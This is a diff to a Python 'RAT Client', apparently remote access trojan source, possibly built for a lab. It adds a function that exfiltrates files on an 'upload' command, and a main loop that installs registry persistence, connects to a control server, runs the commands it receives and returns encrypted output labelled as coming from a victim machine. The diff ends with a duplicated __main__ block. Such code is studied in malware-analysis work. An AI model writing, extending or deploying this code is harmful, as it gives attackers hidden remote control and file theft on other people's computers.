@@ -248,55 +248,112 @@ def execute_command(command):
         return "[Command timed out after 60 seconds]"
     except Exception as e:
         return f"[Command execution error: {str(e)}]"
+def recv_exact(sock, n):
+    data = b""
+    while len(data) < n:
+        packet = sock.recv(n - len(data))
+        if not packet:
+            raise ConnectionError("Connection closed unexpectedly")
+        data += packet
+    return data
 
-# ===== Main Function =====
+def send_file(sock, filepath):
+    filesize = os.path.getsize(filepath)
+    filename = os.path.basename(filepath)
+    header = f"download_result {filename} {filesize}"
+    sock.sendall(encrypt_data(header.encode('utf-8')))
+
+    with open(filepath, "rb") as f:
+        while True:
+            chunk = f.read(1024)
+            if not chunk:
+                break
+            enc_chunk = encrypt_data(chunk)
+            sock.sendall(len(enc_chunk).to_bytes(4, 'big'))
+            sock.sendall(enc_chunk)
+    debug_print(f"File {filename} sent successfully.")
+
 def main():
-    debug_print("RAT Client starting...")
-    
-    # Initial delay if configured
+    debug_print("RAT Client started.")
     if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
-        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)")
+        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
         time.sleep(SIMULATE_STARTUP_DELAY)
-    
-    # Install persistence
-    if add_to_registry():
-        debug_print("Persistence established")
+
+    persistence_result = add_to_registry()
+    if persistence_result:
+        debug_print("Persistence setup completed.")
     else:
-        debug_print("Persistence setup failed")
-    
-    # Main connection loop
+        debug_print("Persistence setup failed or skipped.")
+
     sock = None
-    while True:
-        try:
+    try:
+        while True:
             if sock is None:
                 sock = connect_to_server()
-            
-            data = sock.recv(BUFFER_SIZE)
-            if not data:
-                raise ConnectionError("Server disconnected")
-                
-            # Decrypt and execute command
-            decrypted_cmd = decrypt_data(data)
-            debug_print(f"Received command: {decrypted_cmd[:100]}...")  
-            
-            output = execute_command(decrypted_cmd)
-            debug_print(f"Command output: {output[:200]}...")  
-            # Send response
-            response = f"[{socket.gethostname()}]\n{output}\n"
-            sock.sendall(encrypt_data(response))
-            
-        except (ConnectionResetError, BrokenPipeError):
-            debug_print("Connection lost, reconnecting...")
-            if sock:
+
+            try:
+                data = sock.recv(BUFFER_SIZE)
+                if not data:
+                    debug_print("Server closed the connection.")
+                    sock.close()
+                    sock = None
+                    time.sleep(RECONNECT_DELAY)
+                    continue
+
+                decrypted_command = decrypt_data(data).decode('utf-8', errors='ignore').strip()
+                debug_print(f"Received command: {decrypted_command}")
+
+                if decrypted_command.startswith("upload "):
+                    parts = decrypted_command.split(" ", 2)
+                    if len(parts) == 3:
+                        filepath = parts[1]
+                        try:
+                            send_file(sock, filepath)
+                        except Exception as e:
+                            debug_print(f"Error sending file: {e}")
+                    continue
+
+                output = execute_command(decrypted_command)
+                response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
+                sock.sendall(encrypt_data(response.encode('utf-8')))
+                debug_print("Output sent back to server.")
+
+            except socket.timeout:
+                debug_print("Socket timeout (unexpected).")
                 sock.close()
-            sock = None
-            time.sleep(RECONNECT_DELAY)
-        except Exception as e:
-            debug_print(f"Error in main loop: {e}")
-            if sock:
+                sock = None
+            except (ConnectionResetError, BrokenPipeError):
+                debug_print("Connection to server lost.")
                 sock.close()
-            sock = None
-            time.sleep(RECONNECT_DELAY)
+                sock = None
+                time.sleep(RECONNECT_DELAY)
+            except Exception as e:
+                debug_print(f"Error in main loop: {e}")
+                try:
+                    sock.close()
+                except:
+                    pass
+                sock = None
+                time.sleep(RECONNECT_DELAY)
+
+    except KeyboardInterrupt:
+        debug_print("Client stopped by user (Ctrl+C).")
+    except Exception as e:
+        debug_print(f"Unexpected error in main: {e}")
+    finally:
+        if sock:
+            try:
+                sock.close()
+                debug_print("Socket closed.")
+            except:
+                pass
+        debug_print("RAT Client exiting.")
+
+if __name__ == "__main__":
+    if "--autorun" not in sys.argv:
+        sys.exit(0)
+    main()
+
 
 if __name__ == "__main__":
     # Check if we were launched with --autorun or from persistence
